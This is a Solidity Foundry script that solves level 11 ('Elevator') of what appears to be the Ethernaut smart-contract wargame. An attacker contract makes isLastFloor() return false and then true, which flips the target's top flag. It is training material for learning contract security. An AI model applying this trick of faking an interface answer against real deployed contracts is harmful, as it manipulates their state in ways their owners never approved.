// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import { Elevator } from "../src/level11.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

///@notice Abusing self created interface function
contract Level11Solution is Script {
    Elevator public level = Elevator(0x6ACB350318A39af1aF4E7aCE463734a374cE15e8);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        BuildingAttacker attacker = new BuildingAttacker(level);
        attacker.attack();
        console.log("top: ", level.top());

        vm.stopBroadcast();
    }
}

contract BuildingAttacker {
    Elevator level;
    bool private thisSwitch; // The default value of bool is false if not declared.

    constructor(Elevator _level){
        level = _level;
    }

    function attack() external {
        level.goTo(888);
    }

    // Custom isLastFloor() which returns the correct bool value
    function isLastFloor(uint _floor) external returns (bool) {

        if(!thisSwitch){
            thisSwitch = true;
            return false;
        } else {
            return true;
        }
    }
}